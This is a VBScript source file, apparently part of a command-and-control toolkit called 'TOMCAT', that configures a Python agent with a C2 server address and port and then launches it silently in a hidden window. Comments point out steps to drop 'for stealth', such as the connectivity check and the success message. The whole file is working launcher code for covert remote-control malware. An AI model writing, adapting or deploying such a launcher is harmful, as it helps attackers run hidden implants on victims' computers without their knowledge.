' TOMCAT C2 Agent Connector for Windows (VBScript)
' This script runs the Python agent silently without showing console window
' Author: TOM7

Option Explicit

' Configuration
Dim serverHost, serverPort, agentScript
serverHost = "127.0.0.1"  ' Change this to your C2 server IP
serverPort = "4444"        ' Change this if using different port
agentScript = "tomcatv1a.py"

' Variables
Dim fso, shell, scriptPath, pythonCmd, tempScript, logFile
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Get current directory
scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)

' Log file for debugging (optional - comment out to disable logging)
logFile = scriptPath & "\tomcat_connector.log"

' Function to write log
Sub WriteLog(message)
    Dim logStream
    On Error Resume Next
    Set logStream = fso.OpenTextFile(logFile, 8, True) ' 8 = ForAppending
    logStream.WriteLine Now & " - " & message
    logStream.Close
    On Error GoTo 0
End Sub

' Function to check if file exists
Function FileExists(filePath)
    FileExists = fso.FileExists(filePath)
End Function

' Function to find Python executable
Function FindPython()
    Dim pythonPaths, path
    pythonPaths = Array( _
        "python.exe", _
        "pythonw.exe", _
        "py.exe", _
        "C:\Python39\python.exe", _
        "C:\Python38\python.exe", _
        "C:\Python37\python.exe", _
        "C:\Program Files\Python39\python.exe", _
        "C:\Program Files\Python38\python.exe", _
        "C:\Program Files\Python37\python.exe", _
        fso.GetSpecialFolder(0) & "\Python39\python.exe", _
        fso.GetSpecialFolder(0) & "\Python38\python.exe" _
    )

    ' Try to find Python in PATH first
    On Error Resume Next
    shell.Run "cmd /c where python > nul 2>&1", 0, True
    If Err.Number = 0 Then
        FindPython = "python.exe"
        Exit Function
    End If

    shell.Run "cmd /c where pythonw > nul 2>&1", 0, True
    If Err.Number = 0 Then
        FindPython = "pythonw.exe"
        Exit Function
    End If

    shell.Run "cmd /c where py > nul 2>&1", 0, True
    If Err.Number = 0 Then
        FindPython = "py.exe"
        Exit Function
    End If
    On Error GoTo 0

    ' Try common installation paths
    For Each path In pythonPaths
        If FileExists(path) Then
            FindPython = path
            Exit Function
        End If
    Next

    ' Python not found
    FindPython = ""
End Function

' Function to check if server is reachable
Function CheckServer(host, port)
    On Error Resume Next
    Dim xmlHttp
    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttp.setTimeouts 3000, 3000, 3000, 3000
    xmlHttp.open "GET", "http://" & host & ":" & port, False
    xmlHttp.send

    If Err.Number = 0 Then
        CheckServer = True
    Else
        CheckServer = False
    End If
    On Error GoTo 0
End Function

' Function to update agent script
Sub UpdateAgentScript(scriptFile, host, port)
    On Error Resume Next
    Dim fileContent, newContent, file

    ' Read original file
    Set file = fso.OpenTextFile(scriptFile, 1) ' 1 = ForReading
    fileContent = file.ReadAll
    file.Close

    ' Replace server host
    newContent = Replace(fileContent, "serverHost = ""127.0.0.1""", "serverHost = """ & host & """")
    newContent = Replace(newContent, "serverHost = '127.0.0.1'", "serverHost = '" & host & "'")

    ' Replace server port
    newContent = Replace(newContent, "serverPort = 4444", "serverPort = " & port)

    ' Write back to file
    Set file = fso.OpenTextFile(scriptFile, 2) ' 2 = ForWriting
    file.Write newContent
    file.Close
    On Error GoTo 0
End Sub

' Main execution
Sub Main()
    WriteLog "=== TOMCAT C2 Agent Connector Started ==="
    WriteLog "Server: " & serverHost & ":" & serverPort

    ' Check if agent script exists
    Dim fullAgentPath
    fullAgentPath = scriptPath & "\" & agentScript

    If Not FileExists(fullAgentPath) Then
        WriteLog "ERROR: Agent script not found: " & fullAgentPath
        MsgBox "Agent script not found: " & agentScript & vbCrLf & vbCrLf & _
               "Please make sure " & agentScript & " is in the same directory as this script.", _
               vbCritical, "TOMCAT C2 Connector"
        WScript.Quit 1
    End If

    WriteLog "Agent script found: " & fullAgentPath

    ' Find Python
    pythonCmd = FindPython()
    If pythonCmd = "" Then
        WriteLog "ERROR: Python not found"
        MsgBox "Python not found!" & vbCrLf & vbCrLf & _
               "Please install Python from https://www.python.org/downloads/" & vbCrLf & _
               "Make sure to check 'Add Python to PATH' during installation.", _
               vbCritical, "TOMCAT C2 Connector"
        WScript.Quit 1
    End If

    WriteLog "Python found: " & pythonCmd

    ' Update agent script with server details
    WriteLog "Configuring agent..."
    UpdateAgentScript fullAgentPath, serverHost, serverPort
    WriteLog "Agent configured"

    ' Check server connectivity (optional - can be commented out for stealth)
    WriteLog "Testing server connectivity..."
    ' Uncomment the line below to enable server check
    ' If Not CheckServer(serverHost, serverPort) Then
    '     WriteLog "WARNING: Server not reachable"
    ' End If

    ' Launch agent silently
    WriteLog "Launching agent..."

    ' Use pythonw.exe for silent execution (no console window)
    Dim cmd
    If InStr(pythonCmd, "pythonw") > 0 Then
        cmd = pythonCmd & " """ & fullAgentPath & """"
    Else
        ' If python.exe, try to use pythonw.exe instead
        Dim pythonwPath
        pythonwPath = Replace(pythonCmd, "python.exe", "pythonw.exe")
        If FileExists(pythonwPath) Or InStr(pythonCmd, "\") = 0 Then
            cmd = pythonwPath & " """ & fullAgentPath & """"
        Else
            cmd = pythonCmd & " """ & fullAgentPath & """"
        End If
    End If

    WriteLog "Command: " & cmd

    ' Run silently (0 = hide window, False = don't wait for completion)
    On Error Resume Next
    shell.Run cmd, 0, False

    If Err.Number <> 0 Then
        WriteLog "ERROR: Failed to launch agent - " & Err.Description
        MsgBox "Failed to launch agent!" & vbCrLf & vbCrLf & _
               "Error: " & Err.Description, _
               vbCritical, "TOMCAT C2 Connector"
        WScript.Quit 1
    End If

    WriteLog "Agent launched successfully"
    WriteLog "=== Connector finished ==="
    On Error GoTo 0

    ' Success message (optional - comment out for stealth)
    ' MsgBox "TOMCAT Agent started successfully!" & vbCrLf & vbCrLf & _
    '        "Connecting to: " & serverHost & ":" & serverPort, _
    '        vbInformation, "TOMCAT C2 Connector"
End Sub

' Run main function
Main()

' Clean up
Set fso = Nothing
Set shell = Nothing

WScript.Quit 0
